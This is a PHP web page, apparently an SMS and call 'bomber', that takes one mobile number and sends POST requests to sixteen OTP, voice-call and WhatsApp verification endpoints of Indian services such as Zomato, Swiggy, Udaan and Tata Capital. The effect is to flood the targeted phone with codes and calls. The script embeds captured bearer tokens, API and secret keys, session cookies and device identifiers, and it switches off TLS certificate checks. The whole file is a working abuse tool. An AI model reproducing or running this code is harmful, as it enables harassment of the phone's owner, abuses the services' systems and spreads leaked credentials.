<!DOCTYPE html>
<html>
<head>
    <title>API Executor</title>
</head>
<body>
    <h1>API Executor</h1>
    <form method="get" action="">
        <label for="mobile">Enter Mobile Number:</label>
        <input type="text" id="mobile" name="mobile" required>
        <button type="submit">Submit</button>
    </form>

    <?php
    if (isset($_GET['mobile'])) {
        $mobile = htmlspecialchars($_GET['mobile']);
        $apis = [
            // ============ OLD APIS ============
            // API 1: Astroyogi GenerateOtpV3
            [
                "url" => "https://chapp.astroyogi.com/api/UserAccountV3/GenerateOtpV3",
                "data" => http_build_query(["MobileNumber" => $mobile, "PhonCode" => "91", "CountryCode" => "IN", "Plateform" => "Android", "IsResend" => "false", "PhoneDeviceId" => "baf9c2340552f28e"]),
                "headers" => ["Content-Type: application/x-www-form-urlencoded", "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IlR0YUFwcFVzZXIiLCJFbnRpdHlJZCI6IjI3NDk4NDY1IiwiU291cmNlVXNlclR5cGUiOiJUdGFBcHBVc2VyIiwiU291cmNlRW50aXR5SWQiOiIyNzQ5ODQ2NSIsIm5iZiI6MTc3Njk1NzY3NCwiZXhwIjoxNzg0NzMzODU1fQ."]
            ],
            // API 2: Astroyogi SendOtp (Original)
            [
                "url" => "https://comm.astroyogi.com/api/OtpComm/SendOtp",
                "data" => json_encode(["countryCode" => "IN", "mobileNumber" => $mobile, "phoneCode" => "91", "phoneDeviceId" => "baf9c2340552f28e", "platform" => "Android", "requestType" => "call"]),
                "headers" => ["Content-Type: application/json; charset=UTF-8", "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IlR0YUFwcFVzZXIiLCJFbnRpdHlJZCI6IjI3NDk4NDY1IiwiU291cmNlVXNlclR5cGUiOiJUdGFBcHBVc2VyIiwiU291cmNlRW50aXR5SWQiOiIyNzQ5ODQ2NSIsIm5iZiI6MTc3Njk1NzY3NCwiZXhwIjoxNzg0NzMzODU1fQ.", "versioncode: 577", "devicetype: Android"]
            ],
            // API 3: Astroyogi SendOtp (HTTP/2 Version with Web platform)
            [
                "url" => "https://comm.astroyogi.com/api/OtpComm/SendOtp",
                "data" => json_encode(["phoneCode" => "91", "countryCode" => "IN", "mobileNumber" => $mobile, "platform" => "Web", "IpAddress" => "106.207.213.98", "requestType" => "call", "countryCodeByHeader" => "IN"]),
                "headers" => [
                    "Host: comm.astroyogi.com",
                    "sec-ch-ua-platform: \"Android\"",
                    "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzc2OTUyMTE3LCJleHAiOjE3ODQ3MjgxMTd9.",
                    "accept-language: en-US",
                    "sec-ch-ua: \"Android WebView\";v=\"147\", \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"147\"",
                    "sec-ch-ua-mobile: ?1",
                    "accept: application/json, text/plain, */*",
                    "Content-Type: application/json",
                    "origin: https://www.astroyogi.com",
                    "x-requested-with: mark.via.gp",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.astroyogi.com/registration/login.aspx",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "priority: u=1, i"
                ]
            ],
            // API 4: Zomato SMS Verification
            [
                "url" => "https://accounts.zomato.com/login/phone",
                "data" => http_build_query(["number" => $mobile, "country_id" => "1", "lc" => "26fd3c9af2914791b566f84867425876", "type" => "initiate", "verification_type" => "sms", "package_name" => "com.application.zomato", "message_uuid" => ""]),
                "headers" => ["x-request-id: 5b951ef5-fa72-4309-8059-be7bf073f3da"]
            ],
            // API 5: Zomato Call Verification
            [
                "url" => "https://accounts.zomato.com/login/phone",
                "data" => http_build_query(["number" => $mobile, "country_id" => "1", "lc" => "26fd3c9af2914791b566f84867425876", "type" => "initiate", "verification_type" => "call", "package_name" => "", "message_uuid" => "sms-service-v2-bd91d1cd-389c-46ad-88cc-dc6f1d847d1c"]),
                "headers" => ["x-request-id: db6007db-59a0-4782-a257-6ca0ec03d9e0"]
            ],
            // API 6: Udaan - Send OTP via WhatsApp
            [
                "url" => "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true",
                "data" => http_build_query(["mobile" => $mobile]),
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded;charset=UTF-8",
                    "traceparent: 00-44bc4d300f0fb27d2e9b4c637ad0807b-172dd0a728064eda-00",
                    "x-app-id: udaan-auth",
                    "origin: https://auth.udaan.com",
                    "referer: https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2"
                ]
            ],
            // API 7: Udaan - Send OTP via Call
            [
                "url" => "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&getOTPCall=true&whatsappConsent=false",
                "data" => http_build_query(["mobile" => $mobile]),
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded;charset=UTF-8",
                    "traceparent: 00-83ce99a6dae2dc6175e863baa2bee4ec-2f2994fda89d06d6-00",
                    "x-app-id: udaan-auth",
                    "origin: https://auth.udaan.com",
                    "referer: https://auth.udaan.com/login/v2/otp?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2&locale=en_IN&mobile=$mobile&whatsappConsent=true"
                ]
            ],
            // API 8: Clovia - Send OTP on Call
            [
                "url" => "https://www.clovia.com/api/v4/users/send-otp-on-call/",
                "data" => json_encode(["phone" => $mobile, "is_signup" => "false", "email" => "", "otp" => ""]),
                "headers" => [
                    "Content-Type: application/json",
                    "secretkey: _fxv&8)36e@kb8na3nj@azl@hzdkfmpaf)lf0+!kt4tu!=feea",
                    "apikey: u(ihlye!wv)d6zpiyp@qxyqwlt)86#o%v^t%@ki-i@bm+18x7g",
                    "origin: https://www.clovia.com",
                    "x-requested-with: mark.via.gp",
                    "referer: https://www.clovia.com/accounts/secure/login/?srsltid=AfmBOorF8t7l06D_i2EiFqIajgE7OA0dOsQagkOnhqYnuKdYptXVU3bM"
                ]
            ],
            
            // ============ NEW APIS ============
            // API 9: Swiggy API
            [
                "url" => "https://profile.swiggy.com/api/v3/app/request_call_verification",
                "data" => json_encode(["mobile" => $mobile]),
                "headers" => ["Content-Type: application/json", "user-agent: okhttp/3.9.1", "accept: */*", "accept-encoding: gzip, deflate, br"]
            ],
            // API 10: IndiaLends API
            [
                "url" => "https://indialends.com/pl/SP_MVResend",
                "data" => "MobileNumber=" . urlencode($mobile) . "&Mode=2",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
                    "sec-ch-ua-platform: \"Android\"",
                    "x-requested-with: XMLHttpRequest",
                    "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
                    "accept: */*",
                    "sec-ch-ua: \"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
                    "sec-ch-ua-mobile: ?1",
                    "origin: https://indialends.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://indialends.com/personal-loan",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                    "priority: u=1, i"
                ]
            ],
            // API 11: PenPencil API
            [
                "url" => "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
                "data" => json_encode(["organizationId" => "5eb393ee95fab7468a79d189", "mobile" => $mobile]),
                "headers" => ["Content-Type: application/json", "user-agent: okhttp/3.9.1", "accept: */*", "accept-encoding: gzip, deflate, br"]
            ],
            // API 12: Tata Capital API
            [
                "url" => "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
                "data" => json_encode(["phone" => $mobile, "applSource" => "", "isOtpViaCallAtLogin" => "true"]),
                "headers" => ["Content-Type: application/json", "user-agent: okhttp/3.9.1", "accept: */*", "accept-encoding: gzip, deflate, br"]
            ],
            // API 13: Pride of Cows API
            [
                "url" => "https://prideofcows.com/prideofcows/api/customer/voiceotp",
                "data" => json_encode(["MobileNo" => $mobile]),
                "headers" => [
                    "Content-Type: application/json",
                    "X-CSRF-Token: iZ0Sk-jaQuHHIP1lFfuV47-LtTgSErAPTnuCuoebNVP6yUf0xagsrY5FiSFhncSh3b7SXUJ25F19GNPA4_dPAw==",
                    "sec-ch-ua-platform: \"Android\"",
                    "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                    "sec-ch-ua-mobile: ?1",
                    "X-Requested-With: XMLHttpRequest",
                    "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                    "accept: */*",
                    "origin: https://prideofcows.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://prideofcows.com/poc/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-GB,en-US;q=0.9,en;q=0.8"
                ]
            ],
            // API 14: Milkbasket API
            [
                "url" => "https://consumerbff.milkbasket.com/graphql",
                "data" => json_encode([
                    "operationName" => "registerNumber",
                    "variables" => [
                        "phone" => $mobile,
                        "retry" => true,
                        "retryType" => "voice",
                        "appHash" => "",
                        "udid" => "7X6mgrT7lIYb3OkF"
                    ],
                    "query" => "mutation registerNumber(\$phone: String!, \$retry: Boolean!, \$retryType: String!, \$appHash: String!, \$udid: String!) {\n  registerPhoneNumber(\n    phone: \$phone\n    retry: \$retry\n    retryType: \$retryType\n    appHash: \$appHash\n    udid: \$udid\n  ) {\n    status\n    error\n    errorMsg\n    otpBlockTime\n    __typename\n  }\n}"
                ]),
                "headers" => [
                    "Content-Type: application/json",
                    "sec-ch-ua-platform: \"Android\"",
                    "sec-ch-ua: \"Not;A=Brand\";v=\"99\", \"Android WebView\";v=\"139\", \"Chromium\";v=\"139\"",
                    "accept: */*",
                    "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/139.0.7258.158 Mobile Safari/537.36",
                    "origin: https://milkbasket.web.app",
                    "sec-fetch-site: cross-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://milkbasket.web.app/",
                    "accept-encoding: gzip, deflate, br, zstd"
                ]
            ],
            // API 15: Happi Mobiles API
            [
                "url" => "https://dev-services.happimobiles.com/api/user-login/homepage",
                "data" => json_encode(["phone" => $mobile]),
                "headers" => [
                    "Content-Type: application/json",
                    "x-sign: 039babb5984ef534593dbf045e54a798522d3fd35a91b1652aaa12b12bc6d51d",
                    "sec-ch-ua-platform: \"Android\"",
                    "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.51 Mobile Safari/537.36",
                    "sec-ch-ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Android WebView\";v=\"140\"",
                    "sec-ch-ua-mobile: ?1",
                    "accept: */*",
                    "origin: https://www.happimobiles.com",
                    "X-Requested-With: mark.via.gp",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.happimobiles.com/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-GB,en-US;q=0.9,en;q=0.8"
                ]
            ],
            // API 16: Smartcoin API
            [
                "url" => "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
                "data" => json_encode(["mobile" => $mobile]),
                "headers" => [
                    "Content-Type: application/json",
                    "sec-ch-ua-platform: \"Android\"",
                    "user_platform: WEBFLOW",
                    "sec-ch-ua: \"Android WebView\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
                    "sec-ch-ua-mobile: ?1",
                    "platform_code: olyv",
                    "user-agent: Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.34 Mobile Safari/537.36",
                    "accept: application/json, text/plain, */*",
                    "origin: https://app.olyv.co.in",
                    "x-requested-with: mark.via.gp",
                    "sec-fetch-site: cross-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://app.olyv.co.in/",
                    "accept-encoding: gzip, deflate, br, zstd",
                    "accept-language: en-GB,en-US;q=0.9,en;q=0.8",
                    "priority: u=1, i"
                ]
            ]
        ];

        // Common headers for all requests
        $commonHeaders = [
            "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
            "Accept-Encoding: gzip, deflate, br",
            "Connection: keep-alive"
        ];

        foreach ($apis as $index => $api) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $api['url']);
            curl_setopt($ch, CURLOPT_POST, true);
            
            // Merge headers
            $headers = $commonHeaders;
            
            // Add API specific headers
            if (isset($api['headers'])) {
                $headers = array_merge($headers, $api['headers']);
            }
            
            // Add Udaan specific cookies
            if (strpos($api['url'], 'udaan') !== false) {
                $headers[] = "Cookie: _gid=GA1.2.1359549543.1777092160; sid=q0GQLEfQJ3oBAIosYu7a0Sd6h6Yqc2YoZOWpnUB5uzFq6Nvs6CAPBZz/OdCqfJXptmWSiMR23bYeeXkyPTFSuyAx; WZRK_S_8R9-67W-W75Z=%7B%22p%22%3A1%7D; _gat_gtag_UA_180706540_1=1; _ga_VDVX6P049R=GS2.1.s1777092162$o1$g0$t1777092162$j60$l0$h0; _ga=GA1.1.1771292398.1777092160";
            }
            
            // Add Clovia specific cookies
            if (strpos($api['url'], 'clovia') !== false) {
                $headers[] = "Cookie: csrftoken=S7c7JiVhJVfH4YOYSi00XijLsHdlE4kP; sessionid=eprfkdq77n1mkamamko5ji7cs9zdt8ps; nur=None; http_referer_val=\"firstclicktime=2026-04-28 12:29:51.876421\\054http_referer=https://www.clovia.com/accounts/secure/login/?srsltid=AfmBOorF8t7l06D_i2EiFqIajgE7OA0dOsQagkOnhqYnuKdYptXVU3bM\"; whatsup_checked=1; fw_se={%22value%22:%22fws2.4a57d2b0-5074-4ef0-93c5-b8a4835fe3d9.1.1777359592737%22%2C%22createTime%22:%222026-04-28T06:59:52.740Z%22}; fw_uid={%22value%22:%223103efc9-fe5f-4ef0-9477-96af3f5ea6cf%22%2C%22createTime%22:%222026-04-28T06:59:52.760Z%22}; G_ENABLED_IDPS=google; __sts=eyJzaWQiOjE3NzczNTk1OTMwOTIsInR4IjoxNzc3MzU5NTkzMDkyLCJ1cmwiOiJodHRwcyUzQSUyRiUyRnd3dy5jbG92aWEuY29tJTJGYWNjb3VudHMlMkZzZWN1cmUlMkZsb2dpbiUyRiUzRnNyc2x0aWQlM0RBZm1CT29yRjh0N2wwNkRfaTJFaUZxSWFqZ0U3T0EwZE9zUWFna09uaHFZbnVLZFlwdFhWVTNiTSIsInBldCI6MTc3NzM1OTU5MzA5Miwic2V0IjoxNzc3MzU5NTkzMDkyfQ%3D%3D; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiJhNjA1YTU2Zi0yMGYyLTRjY2ItOGNhZi02MjFlZDNkYzlmODcifQ%3D%3D; _fbp=fb.1.1777359593388.33417334368728057; __stgeo=IjAi; __stdf=MA%3D%3D; afUserId=06489c77-8f7b-4dd0-9c10-f673c161c6bb-p; AF_SYNC=1777359594385; moe_uuid=8fd9bad4-32e0-43b1-8aa8-b0aa5761b04a; _cfuvid=xFpOoxP3z9EivQHDYVz01asLDOdBs4n5N3HxEj2cnnE-1777359597.9264376-1.0.1.1-4.XFstCQ_KZ8xGEI9EfRnuyBGks94oZv2JqlPu85f3Q";
            }
            
            // Add Zomato specific headers
            if (strpos($api['url'], 'zomato') !== false) {
                $headers = array_merge($headers, [
                    "Accept: image/webp",
                    "x-appsflyer-uid: 1776959096141-6030528636273458074",
                    "x-present-lat: 23.0264667",
                    "x-perf-class: PERFORMANCE_AVERAGE",
                    "x-user-defined-lat: 0.0",
                    "x-bluetooth-on: false",
                    "x-jumbo-session-id: aabd552a-ac61-43c9-b9a4-b7d601ec95d11776959097",
                    "x-device-language: en",
                    "x-rider-installed: false",
                    "x-district-installed: false",
                    "x-zomato-client-id: 5276d7f1-910b-4243-92ea-d27e758ad02b",
                    "x-present-long: 75.2543083",
                    "x-client-id: zomato_android_v2",
                    "x-network-type: wifi",
                    "x-zomato-uuid: f7b27fba-3bcc-48ad-9964-6e853374c735",
                    "x-app-language: &lang=en&android_language=en&android_country=",
                    "x-firebase-instance-id: b7b030c285ecc1b0a38df0fb9e9915bf",
                    "x-device-pixel-ratio: 2.0",
                    "x-o2-city-id: -1",
                    "x-android-id: d530fabd580159fc",
                    "x-zomato-app-version-code: 1710019580",
                    "x-present-horizontal-accuracy: 119",
                    "x-zomato-app-version: 958",
                    "x-city-id: -1",
                    "x-device-width: 720",
                    "pragma: akamai-x-get-request-id,akamai-x-cache-on, akamai-x-check-cacheable",
                    "x-vpn-active: 1",
                    "x-app-session-id: 55d5d892-1e46-4887-8dc0-4d51b271d426",
                    "x-device-height: 1344",
                    "x-user-defined-long: 0.0",
                    "x-district-sdk-version: 2.39.2.15",
                    "x-installer-package-name: com.android.vending",
                    "x-blinkit-installed: false",
                    "x-access-uuid: cec6fac3-ab68-480a-935c-c02f8e34d634",
                    "x-accessibility-dynamic-text-scale-factor: 1.0",
                    "x-zomato-api-key: 7749b19667964b87a3efc739e254ada2",
                    "x-district-sdk-enabled: false",
                    "user-bucket: 0",
                    "user-high-priority: 0",
                    "is-akamai-video-optimisation-enabled: 0",
                    "x-app-theme: default",
                    "x-app-appearance: LIGHT",
                    "x-system-appearance: UNSPECIFIED",
                    "x-accessibility-voice-over-enabled: 0",
                    "Cookie: zxcv=82KRyBYZBDZRQCRjn28lScJVYug5x8tyO3WZF2_ZQD4; rurl=https://accounts.zomato.com/zoauth/callback; cid=5276d7f1-910b-4243-92ea-d27e758ad02b; oauth2_authentication_csrf=MTc3Njk1OTE0MHxEdi1CQkFFQ180SUFBUkFCRUFBQVB2LUNBQUVHYzNSeWFXNW5EQVlBQkdOemNtWUdjM1J5YVc1bkRDSUFJREk1TlRoaU1XSmtaRE0xWkRRek5XUmlPV1V6TW1RNVkySTBaVEV5WmpjMnylxInBIz5Rpt7FIkHs1CB1WiBp-3JYKTawBELP81_W4g==; ak_bmsc=704547C121F9D087E24A4DB782388B3F~000000000000000000000000000000~YAAQhfEBFxkO3JCdAQAAe7MEux+EKuh/oVlNnFwaPZTHDnXTD597OhVO6zLgw84DXJNR5fuBhaUjChYehwbGLmPMd1me55OH7LLdZPMaCWZCgE5XhsQCCJ+J7NmxPNS5MyivTk+4OaiHcr+jtJrtd+Hbqzn8czN8Dcu/QP5e57j4Va4/8UguRIkDrgCQK06qXnihYsI0X9JzK9spp/0G5B6znn8XCs68+bkBarmEdg64XGlW0utMsAd36pxjCOi8ezzk6C79usUYglszQnyN5wocPw9oUbXAK58h41im2LPQMmwY7oVD6sB2lfKLlbV9OvhbUGP9oJYTLIBraVlO457sC8yr4kCPfGJeDRoVlbYvoFXiHZQFxCBSkAqUZc3/m1IZuyZoerh31yw="
                ]);
            }
            
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $api['data']);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_ENCODING, '');

            $response = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            echo "<p><strong>API " . ($index+1) . ":</strong> " . $api['url'] . "</p>";
            echo "<p><strong>Response:</strong> " . htmlspecialchars($response) . "</p>";
            echo "<p><strong>Status Code:</strong> " . $httpcode . "</p><hr>";
        }
    }
    ?>
</body>
</html>
